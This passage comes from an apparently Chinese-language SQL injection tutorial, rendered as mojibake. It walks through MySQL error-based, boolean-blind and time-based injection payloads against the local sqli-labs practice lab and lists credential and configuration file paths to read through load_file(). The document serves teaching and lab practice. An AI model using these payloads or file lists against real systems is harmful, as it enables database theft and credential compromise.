æ˜¯å¯¹0 é€ä½å–åï¼Œå¾ˆå¤§çš„ç‰ˆæœ¬åœ¨5.5.5 åŠå…¶ä»¥ä¸Š</code></pre><p>å¯ä»¥å‚è€ƒæ–‡ç« bigint æº¢å‡ºæ–‡ç« <a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><pre class="language-none"><code class="language-none">extractvalue(1,concat(0x7e,(select @@version),0x7e)) --mysql å¯¹xml æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„xpath å‡½æ•°ï¼Œxpath è¯­æ³•é”™è¯¯</code></pre><pre class="language-none"><code class="language-none">updatexml(1,concat(0x7e,(select @@version),0x7e),1) --mysql å¯¹xml æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„xpath å‡½æ•°ï¼Œxpath è¯­æ³•é”™è¯¯</code></pre><pre class="language-none"><code class="language-none">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;--mysql é‡å¤ç‰¹æ€§ï¼Œæ­¤å¤„é‡å¤äº†versionï¼Œæ‰€ä»¥æŠ¥é”™ã€‚</code></pre><p><strong>join using()æ³¨åˆ—å</strong></p><p>é€šè¿‡ç³»ç»Ÿå…³é”®è¯joinå¯å»ºç«‹ä¸¤ä¸ªè¡¨ä¹‹é—´çš„å†…è¿æ¥ã€‚</p><p>é€šè¿‡å¯¹æƒ³è¦æŸ¥è¯¢åˆ—åçš„è¡¨ä¸å…¶è‡ªèº«å»ºè®®å†…è¿æ¥ï¼Œä¼šç”±äºå†—ä½™çš„åŸå› (ç›¸åŒåˆ—åå­˜åœ¨)ï¼Œè€Œå‘ç”Ÿé”™è¯¯ã€‚</p><p>å¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå­˜åœ¨é‡å¤çš„åˆ—åï¼Œå¯ä»¥ä½¿ç”¨USING è¡¨è¾¾å¼å£°æ˜å†…è¿æ¥ï¼ˆINNER JOINï¼‰æ¡ä»¶æ¥é¿å…æŠ¥é”™ã€‚</p><pre class="language-none"><code class="language-none">mysql&gt;select * from(select * from users a join (select * from users)b)c;mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;mysql&gt;select * from(select * from users a join (select * from users)busing(username,password))c</code></pre><p><strong>GTIDç›¸å…³å‡½æ•°</strong></p><p>ä»MySQL 5.6.5 å¼€å§‹æ–°å¢äº†ä¸€ç§åŸºäºGTID çš„å¤åˆ¶æ–¹å¼ã€‚é€šè¿‡GTID ä¿è¯äº†æ¯ä¸ªåœ¨ä¸»åº“ä¸Šæäº¤çš„äº‹åŠ¡åœ¨é›†ç¾¤ä¸­æœ‰ä¸€ä¸ªå”¯ä¸€çš„IDã€‚è¿™ç§æ–¹å¼å¼ºåŒ–äº†æ•°æ®åº“çš„ä¸»å¤‡ä¸€è‡´æ€§ï¼Œæ•…éšœæ¢å¤ä»¥åŠå®¹é”™èƒ½åŠ›ã€‚</p><p>GTID (Global Transaction ID)æ˜¯å…¨å±€äº‹åŠ¡ID,å½“åœ¨ä¸»åº“ä¸Šæäº¤äº‹åŠ¡æˆ–è€…è¢«ä»åº“åº”ç”¨æ—¶ï¼Œå¯ä»¥å®šä½å’Œè¿½è¸ªæ¯ä¸€ä¸ªäº‹åŠ¡ï¼Œå¯¹DBAæ¥è¯´æ„ä¹‰å°±å¾ˆå¤§äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“çš„è§£æ”¾å‡ºæ¥ï¼Œä¸ç”¨æ‰‹å·¥å»å¯ä»¥æ‰¾åç§»é‡çš„å€¼äº†ï¼Œè€Œæ˜¯é€šè¿‡CHANGE MASTER TO MASTER_HOST=â€™xxxâ€™, MASTER_AUTO_POSITION=1çš„å³å¯æ–¹ä¾¿çš„æ­å»ºä»åº“ï¼Œåœ¨æ•…éšœä¿®å¤ä¸­ä¹Ÿå¯ä»¥é‡‡ç”¨MASTER_AUTO_POSITION=â€˜Xâ€™çš„æ–¹å¼ã€‚</p><p>å¯èƒ½å¤§å¤šæ•°äººç¬¬ä¸€æ¬¡å¬åˆ°GTIDçš„æ—¶å€™ä¼šæ„Ÿè§‰æœ‰äº›çªå…€ï¼Œä½†æ˜¯ä»æ¶æ„è®¾è®¡çš„è§’åº¦ï¼ŒGTIDæ˜¯ä¸€ç§å¾ˆå¥½çš„åˆ†å¸ƒå¼IDå®è·µæ–¹å¼ï¼Œé€šå¸¸æ¥è¯´ï¼Œåˆ†å¸ƒå¼IDæœ‰ä¸¤ä¸ªåŸºæœ¬è¦æ±‚ï¼š 1ï¼‰å…¨å±€å”¯ä¸€æ€§ 2ï¼‰è¶‹åŠ¿é€’å¢ è¿™ä¸ªIDå› ä¸ºæ˜¯å…¨å±€å”¯ä¸€ï¼Œæ‰€ä»¥åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸­å¾ˆå®¹æ˜“è¯†åˆ«ï¼Œå› ä¸ºè¶‹åŠ¿é€’å¢ï¼Œæ‰€ä»¥IDæ˜¯å…·æœ‰ç›¸åº”çš„è¶‹åŠ¿è§„å¾‹ï¼Œåœ¨å¿…è¦çš„æ—¶å€™æ–¹ä¾¿è¿›è¡Œé¡ºåºæå–ï¼Œè¡Œä¸šå†…é€‚ç”¨è¾ƒå¤šçš„æ˜¯åŸºäºTwitterçš„IDç”Ÿæˆç®—æ³•snowflake,æ‰€ä»¥æ¢ä¸€ä¸ªè§’åº¦æ¥ç†è§£GTIDï¼Œå…¶å®æ˜¯ä¸€ç§ä¼˜é›…çš„åˆ†å¸ƒå¼è®¾è®¡ã€‚</p><pre class="language-none"><code class="language-none">mysql&gt;select gtid_subset(user(),1);mysql&gt;select gtid_subset(hex(substr((select * from users limit1,1),1,1)),1);mysql&gt;select gtid_subtract((select * from(select user())a),1);</code></pre><p><strong>æŠ¥é”™å‡½æ•°é€ŸæŸ¥è¡¨</strong></p><p><strong>sqli-labs/less-5</strong></p><p><strong>ä¸€ï¼šç›²æ³¨</strong></p><pre class="language-none"><code class="language-none">ï¼ˆ1ï¼‰åˆ©ç”¨left(database(),3)è¿›è¡Œå°è¯•http://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),3)=5.7--+    æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹æ•°æ®åº“çš„é•¿åº¦http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+    çŒœæµ‹æ•°æ®åº“ç¬¬ä¸€ä½http://127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)&gt;'a'--+    ç”¨æ­¤æ–¹æ³•æ¨æµ‹å‡ºå…¶ä»–å‡ ä½ï¼ˆ2ï¼‰åˆ©ç”¨substr() ascii()å‡½æ•°è¿›è¡Œå°è¯•/leftä¹Ÿå¯ä»¥ï¼Œéƒ½è¡Œhttp://127.0.0.1/sqli-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;65 --+    ç”¨æ­¤æ–¹æ³•æ¨æµ‹å‡ºå…¶ä»–å‡ ä½ï¼Œå¾—åˆ°ç¬¬ä¸€ä¸ªè¡¨å    æ¥ä¸‹æ¥ç”¨limit 1,1å¾—åˆ°ç¬¬äºŒä¸ªè¡¨åï¼Œä»¥æ­¤ç±»æ¨ï¼ˆ3ï¼‰åˆ©ç”¨regexp è·å–è¡¨ä¸­çš„åˆ—http://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+    ç”¨æ­¤æ–¹æ³•æ¨æµ‹å‡ºå…¶ä»–å‡ ä½ï¼Œå¾—åˆ°åˆ—åï¼ˆ4ï¼‰åˆ©ç”¨ord()å’Œmid()å‡½æ•°è·å–users è¡¨çš„å†…å®¹http://127.0.0.1/sqli-labs/Less-5/?id=1' and ord(mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+    è§£é‡Šï¼š    IFNULL(v1,v2):å¦‚æœ v1 çš„å€¼ä¸ä¸º NULLï¼Œåˆ™è¿”å› v1ï¼Œå¦åˆ™è¿”å› v2ã€‚    CAST(x AS type)ï¼šè½¬æ¢æ•°æ®ç±»å‹    SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1    æ‰€ä»¥è¿™å¥å°±æ˜¯å…ˆä»è¡¨userså°†usernameå­—æ®µå–å‡ºé€šè¿‡order byè¿›è¡Œå‡åºï¼Œå–å‡ºç¬¬ä¸€è¡Œçš„æ•°æ®ï¼Œå†castå°†å…¶è½¬åŒ–ä¸ºå­—    ç¬¦ç±»å‹ï¼Œåœ¨é€šè¿‡IFNULLåˆ¤æ–­å…¶é‡Œé¢çš„æ•°æ®æ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™è¿”å›å…¶æ•°æ®ã€‚ä»¥ä¸Šï¼ˆ1ï¼‰ï¼ˆ2ï¼‰ï¼ˆ3ï¼‰ï¼ˆ4ï¼‰æˆ‘ä»¬é€šè¿‡ä½¿ç”¨ä¸åŒçš„è¯­å¥ï¼Œé€šè¿‡å¸ƒå°”ç›²æ³¨SQLæŠŠæ‰€æœ‰çš„payload è¿›è¡Œæ¼”ç¤ºäº†ä¸€æ¬¡ã€‚æƒ³å¿…é€šè¿‡å®ä¾‹æ›´èƒ½å¤Ÿå¯¹sql å¸ƒå°”ç›²æ³¨è¯­å¥ç†Ÿæ‚‰å’Œç†è§£äº†</code></pre><p><strong>äºŒï¼šæŠ¥é”™æ³¨å…¥</strong></p><pre class="language-none"><code class="language-none">ï¼ˆ1ï¼‰é¦–å…ˆä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œåˆ©ç”¨countã€floorã€group byè¿›è¡ŒæŠ¥é”™http://127.0.0.1/sqli-labs/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a--+ï¼ˆ2ï¼‰åˆ©ç”¨double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´è¿›è¡ŒæŠ¥é”™æ³¨å…¥http://127.0.0.1/sqli-labs/Less-5/?id=-1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+ï¼ˆ3ï¼‰åˆ©ç”¨bigint æº¢å‡ºè¿›è¡ŒæŠ¥é”™æ³¨å…¥.http://127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+ï¼ˆ4ï¼‰xpath å‡½æ•°æŠ¥é”™æ³¨å…¥http://127.0.0.1/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+ï¼ˆ5ï¼‰updatexml å‡½æ•°æŠ¥é”™æ³¨å…¥http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+ï¼ˆ6ï¼‰åˆ©ç”¨æ•°æ®çš„é‡å¤æ€§http://127.0.0.1/sqli-labs/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</code></pre><p><strong>updatexml()å‡½æ•°</strong></p><ul><li>updatexmlï¼ˆï¼‰æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸åŒçš„xmlæ ‡è®°åŒ¹é…å’Œæ›¿æ¢xmlå—çš„å‡½æ•°ã€‚</li><li>ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼</li><li>è¯­æ³•ï¼š updatexmlï¼ˆXML_documentï¼ŒXPath_stringï¼Œnew_valueï¼‰ ç¬¬ä¸€ä¸ªå‚æ•°ï¼šæ˜¯stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc ç¬¬äºŒä¸ªå‚æ•°ï¼šä»£è¡¨è·¯å¾„ï¼ŒXpathæ ¼å¼çš„å­—ç¬¦ä¸²ä¾‹å¦‚//titleã€@langã€‘ ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šstringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</li><li>updatexmlä½¿ç”¨æ—¶ï¼Œå½“xpath_stringæ ¼å¼å‡ºç°é”™è¯¯ï¼Œmysqlåˆ™ä¼šçˆ†å‡ºxpathè¯­æ³•é”™è¯¯ï¼ˆxpath syntaxï¼‰</li><li>ä¾‹å¦‚ï¼š select * from test where ide = 1 and (updatexml(1,0x7e,3)); ç”±äº0x7eæ˜¯~ï¼Œä¸å±äºxpathè¯­æ³•æ ¼å¼ï¼Œå› æ­¤æŠ¥å‡ºxpathè¯­æ³•é”™è¯¯ã€‚</li><li>é€‚ç”¨ç‰ˆæœ¬: 5.1.5+</li></ul><pre class="language-none"><code class="language-none">select updatexml(1,concat(0x7e,(select user()),0x7e),1)ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</code></pre><p><strong>extractvalue()å‡½æ•°</strong></p><ul><li>æ­¤å‡½æ•°ä»ç›®æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸² è¯­æ³•ï¼šextractvalueï¼ˆXML_documentï¼Œxpath_stringï¼‰ ç¬¬ä¸€ä¸ªå‚æ•°ï¼šstringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§° ç¬¬äºŒä¸ªå‚æ•°ï¼šxpath_stringï¼ˆxpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼‰ select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li><li>extractvalueä½¿ç”¨æ—¶å½“xpath_stringæ ¼å¼å‡ºç°é”™è¯¯ï¼Œmysqlåˆ™ä¼šçˆ†å‡ºxpathè¯­æ³•é”™è¯¯ï¼ˆxpath syntaxï¼‰</li><li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li><li>ç”±äº0x7eå°±æ˜¯~ä¸å±äºxpathè¯­æ³•æ ¼å¼ï¼Œå› æ­¤æŠ¥å‡ºxpathè¯­æ³•é”™è¯¯ã€‚</li></ul><pre class="language-none"><code class="language-none">select extractvalue(1,concat(0x7e,(select user()),0x7e))ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</code></pre><p><strong>ä¸‰ï¼šå»¶æ—¶æ³¨å…¥</strong></p><pre class="language-none"><code class="language-none">ï¼ˆ1ï¼‰åˆ©ç”¨sleep()å‡½æ•°è¿›è¡Œæ³¨å…¥ï¼Œå½“é”™è¯¯çš„æ—¶å€™ä¼šæœ‰5 ç§’çš„æ—¶é—´å»¶æ—¶ã€‚http://127.0.0.1/sqli-labs/Less-5/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ï¼ˆ2ï¼‰åˆ©ç”¨BENCHMARK()è¿›è¡Œå»¶æ—¶æ³¨å…¥http://127.0.0.1/sqli-labs/Less-5/?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+å½“ç»“æœæ­£ç¡®çš„æ—¶å€™ï¼Œè¿è¡ŒENCODE('MSG','by 5 seconds')æ“ä½œ50000000 æ¬¡ï¼Œä¼šå ç”¨ä¸€æ®µæ—¶é—´ã€‚</code></pre><p>sqli-labs/Less-9çš„payload</p><pre class="language-none"><code class="language-none">--çŒœæµ‹æ•°æ®åº“ï¼šhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+--è¯´æ˜ç¬¬ä¸€ä½æ˜¯s ï¼ˆascii ç æ˜¯115ï¼‰http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+è¯´æ˜ç¬¬ä¸€ä½æ˜¯e ï¼ˆascii ç æ˜¯101ï¼‰....ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬çŸ¥é“äº†æ•°æ®åº“åå­—æ˜¯securityçŒœæµ‹security çš„æ•°æ®è¡¨ï¼šhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+çŒœæµ‹ç¬¬ä¸€ä¸ªæ•°æ®è¡¨çš„ç¬¬ä¸€ä½æ˜¯e,...ä¾æ¬¡ç±»æ¨ï¼Œå¾—åˆ°emailshttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+çŒœæµ‹ç¬¬äºŒä¸ªæ•°æ®è¡¨çš„ç¬¬ä¸€ä½æ˜¯r,...ä¾æ¬¡ç±»æ¨ï¼Œå¾—åˆ°referers...å†ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æ‰€æœ‰çš„æ•°æ®è¡¨emails,referers,uagents,usersçŒœæµ‹users è¡¨çš„åˆ—ï¼šhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+çŒœæµ‹users è¡¨çš„ç¬¬ä¸€ä¸ªåˆ—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯iï¼Œä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å¾—åˆ°åˆ—åæ˜¯idï¼Œusernameï¼ŒpasswordçŒœæµ‹username çš„å€¼ï¼šhttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+çŒœæµ‹username çš„ç¬¬ä¸€è¡Œçš„ç¬¬ä¸€ä½ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬å¾—åˆ°æ•°æ®åº“usernameï¼Œpassword çš„æ‰€æœ‰å†…å®¹ä»¥ä¸Šçš„è¿‡ç¨‹å°±æ˜¯æˆ‘ä»¬åˆ©ç”¨sleep()å‡½æ•°æ³¨å…¥çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œå½“ç„¶äº†å¯ä»¥ç¦»å¼€BENCHMARK()å‡½æ•°è¿›è¡Œæ³¨å…¥</code></pre><h2 id="å¯¼å…¥å¯¼å‡ºç›¸å…³æ“ä½œçš„è®²è§£"><a href="#å¯¼å…¥å¯¼å‡ºç›¸å…³æ“ä½œçš„è®²è§£" class="headerlink" title="å¯¼å…¥å¯¼å‡ºç›¸å…³æ“ä½œçš„è®²è§£"></a>å¯¼å…¥å¯¼å‡ºç›¸å…³æ“ä½œçš„è®²è§£</h2><p>åœ¨äº†è§£å¯¼å…¥å¯¼å‡ºç›¸å…³æ“ä½œæ—¶ï¼Œå…ˆäº†è§£ä»¥ä¸‹<code>Mysql</code>å˜é‡</p><h3 id="mysqlå˜é‡"><a href="#mysqlå˜é‡" class="headerlink" title="mysqlå˜é‡"></a>mysqlå˜é‡</h3><p>mysqldæœåŠ¡å™¨ç»´æŠ¤ä¸¤ç§å˜é‡ã€‚å…¨å±€å˜é‡å½±å“æœåŠ¡å™¨çš„å…¨å±€æ“ä½œã€‚ä¼šè¯å˜é‡å½±å“å…·ä½“å®¢æˆ·ç«¯è¿æ¥ç›¸å…³æ“ä½œã€‚</p><p>æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œå°†æ‰€æœ‰å…¨å±€å˜é‡åˆå§‹åŒ–ä¸ºé»˜è®¤å€¼ã€‚å¯ä»¥åœ¨é€‰é¡¹æ–‡ä»¶æˆ–å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„é€‰é¡¹æ¥æ›´æ”¹è¿™äº›é»˜è®¤å€¼ã€‚æœåŠ¡å™¨å¯åŠ¨åï¼Œé€šè¿‡è¿æ¥æœåŠ¡å™¨å¹¶æ‰§è¡Œ<code>SET GLOBAL var_name</code>è¯­å¥å¯ä»¥æ›´æ”¹åŠ¨æ€å…¨å±€å˜é‡ã€‚è¦æƒ³æ›´æ”¹å…¨å±€å˜é‡ï¼Œå¿…é¡»å…·æœ‰SUPERæƒé™ã€‚</p><p>æœåŠ¡å™¨è¿˜ä¸ºæ¯ä¸ªå®¢æˆ·ç«¯è¿æ¥ç»´æŠ¤ä¼šè¯å˜é‡ã€‚è¿æ¥æ—¶ä½¿ç”¨ç›¸åº”å…¨å±€å˜é‡çš„å½“å‰å€¼å¯¹å®¢æˆ·ç«¯ä¼šè¯å˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚å®¢æˆ·å¯ä»¥é€šè¿‡<code>SET SESSION var_name</code>è¯­å¥æ¥æ›´æ”¹åŠ¨æ€ä¼šè¯å˜é‡ã€‚è®¾ç½®ä¼šè¯å˜é‡ä¸éœ€è¦ç‰¹æ®Šæƒé™ï¼Œä½†å®¢æˆ·å¯ä»¥åªæ›´æ”¹è‡ªå·±çš„ä¼šè¯å˜é‡ï¼Œè€Œä¸æ›´æ”¹å…¶å®ƒå®¢æˆ·çš„ä¼šè¯å˜é‡ã€‚</p><p>å¯ä»¥é€šè¿‡<code>SHOW VARIABLES</code>è¯­å¥æŸ¥çœ‹ç³»ç»Ÿå˜é‡åŠå…¶å€¼ã€‚</p><pre class="language-none"><code class="language-none">mysql&gt; SHOW VARIABLES;</code></pre><p>å¯ä»¥ä½¿ç”¨likeè¯­å¥æ¥åŒ¹é…å’Œç­›é€‰ã€‚</p><p><strong>secure_file_priv</strong></p><blockquote><p><code>secure_file_priv</code>å¯¹è¯»å†™æ–‡ä»¶æœ‰å½±å“ã€‚ <code>secure-file-priv</code>å‚æ•°æ˜¯ç”¨æ¥é™åˆ¶<code>LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()</code>ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚ å½“<code>secure_file_priv</code>çš„å€¼ä¸º<code>null</code> ï¼Œè¡¨ç¤ºé™åˆ¶<code>mysqld</code> ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºã€‚é»˜è®¤æ˜¯<code>null</code> å½“<code>secure_file_priv</code>çš„å€¼ä¸º<code>/tmp/</code> ï¼Œè¡¨ç¤ºé™åˆ¶<code>mysqld</code> çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨<code>/tmp/</code>ç›®å½• ä¸‹ å½“<code>secure_file_priv</code>çš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹<code>mysqld</code> çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</p></blockquote><h3 id="load-file-å¯¼å‡ºæ–‡ä»¶"><a href="#load-file-å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="load_file()å¯¼å‡ºæ–‡ä»¶"></a>load_file()å¯¼å‡ºæ–‡ä»¶</h3><p>Load_file(file_name):è¯»å–æ–‡ä»¶å¹¶è¿”å›è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p><blockquote><p><strong>ä½¿ç”¨æ¡ä»¶ï¼š</strong> Aã€å¿…é¡»æœ‰æƒé™è¯»å–å¹¶ä¸”æ–‡ä»¶å¿…é¡»å®Œå…¨å¯è¯»</p><p>and (select count() from mysql.user)&gt;0 /* å¦‚æœç»“æœè¿”å›æ­£å¸¸,è¯´æ˜å…·æœ‰è¯»å†™æƒé™ã€‚</p><p>and (select count() from mysql.user)&gt;0 /* è¿”å›é”™è¯¯ï¼Œåº”è¯¥æ˜¯ç®¡ç†å‘˜ç»™æ•°æ®åº“å¸æˆ·é™æƒ</p><p>Bã€æ¬²è¯»å–æ–‡ä»¶å¿…é¡»åœ¨æœåŠ¡å™¨ä¸Š</p><p>Cã€å¿…é¡»æŒ‡å®šæ–‡ä»¶å®Œæ•´çš„è·¯å¾„</p><p>Dã€æ¬²è¯»å–æ–‡ä»¶å¿…é¡»å°äºmax_allowed_packet å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œæˆ–å› ä¸ºä¸Šé¢çš„ä»»ä¸€åŸå› è€Œä¸èƒ½è¢«è¯»å‡ºï¼Œå‡½æ•°è¿”å›ç©ºã€‚æ¯”è¾ƒéš¾æ»¡è¶³çš„å°±æ˜¯æƒé™ï¼Œåœ¨windows ä¸‹ï¼Œå¦‚æœNTFS è®¾ç½®å¾—å½“ï¼Œæ˜¯ä¸èƒ½è¯»å–ç›¸å…³çš„æ–‡ä»¶çš„ï¼Œå½“é‡åˆ°åªæœ‰administrators æ‰èƒ½è®¿é—®çš„æ–‡ä»¶ï¼Œusers å°±åˆ«æƒ³load_file å‡ºæ¥ã€‚</p><p>åœ¨å®é™…çš„æ³¨å…¥ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªéš¾ç‚¹éœ€è¦è§£å†³ï¼š</p><p>ç»å¯¹ç‰©ç†è·¯å¾„ æ„é€ æœ‰æ•ˆçš„ç•¸å½¢è¯­å¥ï¼ˆæŠ¥é”™çˆ†å‡ºç»å¯¹è·¯å¾„ï¼‰</p><p>åœ¨å¾ˆå¤šPHP ç¨‹åºä¸­ï¼Œå½“æäº¤ä¸€ä¸ªé”™è¯¯çš„Queryï¼Œå¦‚æœdisplay_errors = onï¼Œç¨‹åºå°±ä¼šæš´éœ²WEB ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œåªè¦çŸ¥é“è·¯å¾„ï¼Œé‚£ä¹ˆå¯¹äºä¸€ä¸ªå¯ä»¥æ³¨å…¥çš„PHP ç¨‹åºæ¥è¯´ï¼Œæ•´ä¸ªæœåŠ¡å™¨çš„å®‰å…¨å°†å—åˆ°ä¸¥é‡çš„å¨èƒã€‚</p></blockquote><h3 id="WINDOWSä¸‹"><a href="#WINDOWSä¸‹" class="headerlink" title="WINDOWSä¸‹:"></a>WINDOWSä¸‹:</h3><blockquote><p>c:/boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p><p>c:/windows/php.ini //phpé…ç½®ä¿¡æ¯</p><p>c:/windows/my.ini //MYSQLé…ç½®æ–‡ä»¶ï¼Œè®°å½•ç®¡ç†å‘˜ç™»é™†è¿‡çš„MYSQLç”¨æˆ·åå’Œå¯†ç </p><p>c:/winnt/php.ini</p><p>c:/winnt/my.ini</p><p>c:\mysql\data\mysql\user.MYD //å­˜å‚¨äº†mysql.userè¡¨ä¸­çš„æ•°æ®åº“è¿æ¥å¯†ç </p><p>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //å­˜å‚¨äº†è™šæ‹Ÿä¸»æœºç½‘ç«™è·¯å¾„å’Œå¯†ç </p><p>c:\Program Files\Serv-U\ServUDaemon.ini</p><p>c:\windows\system32\inetsrv\MetaBase.xml æŸ¥çœ‹IISçš„è™šæ‹Ÿä¸»æœºé…ç½®</p><p>c:\windows\repair\sam //å­˜å‚¨äº†WINDOWSç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç </p><p>c:\Program Files\ Serv-U\ServUAdmin.exe //6.0ç‰ˆæœ¬ä»¥å‰çš„serv-uç®¡ç†å‘˜å¯†ç å­˜å‚¨äºæ­¤</p><p>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</p><p>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cifæ–‡ä»¶</p><p>//å­˜å‚¨äº†pcAnywhereçš„ç™»é™†å¯†ç </p><p>c:\Program Files\Apache Group\Apache\conf\httpd.conf æˆ–C:\apache\conf\httpd.conf //æŸ¥çœ‹WINDOWSç³»ç»Ÿapacheæ–‡ä»¶</p><p>c:/Resin-3.0.14/conf/resin.conf //æŸ¥çœ‹jspå¼€å‘çš„ç½‘ç«™ resinæ–‡ä»¶é…ç½®ä¿¡æ¯.</p><p>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf æŸ¥çœ‹linuxç³»ç»Ÿé…ç½®çš„JSPè™šæ‹Ÿä¸»æœº</p><p>d:\APACHE\Apache2\conf\httpd.conf</p><p>C:\Program Files\mysql\my.ini</p><p>C:\mysql\data\mysql\user.MYD å­˜åœ¨MYSQLç³»ç»Ÿä¸­çš„ç”¨æˆ·å¯†ç </p></blockquote><h3 id="LUNIX-UNIX-ä¸‹"><a href="#LUNIX-UNIX-ä¸‹" class="headerlink" title="LUNIX/UNIX ä¸‹:"></a>LUNIX/UNIX ä¸‹:</h3><blockquote><p>/usr/local/app/apache2/conf/httpd.conf //apache2ç¼ºçœé…ç½®æ–‡ä»¶</p><p>/usr/local/apache2/conf/httpd.conf</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //è™šæ‹Ÿç½‘ç«™è®¾ç½®</p><p>/usr/local/app/php5/lib/php.ini //PHPç›¸å…³è®¾ç½®</p><p>/etc/sysconfig/iptables //ä»ä¸­å¾—åˆ°é˜²ç«å¢™è§„åˆ™ç­–ç•¥</p><p>/etc/httpd/conf/httpd.conf // apacheé…ç½®æ–‡ä»¶</p><p>/etc/rsyncd.conf //åŒæ­¥ç¨‹åºé…ç½®æ–‡ä»¶</p><p>/etc/my.cnf //mysqlçš„é…ç½®æ–‡ä»¶</p><p>/etc/redhat-release //ç³»ç»Ÿç‰ˆæœ¬</p><p>/etc/issue</p><p>/etc/issue.net</p><p>/usr/local/app/php5/lib/php.ini 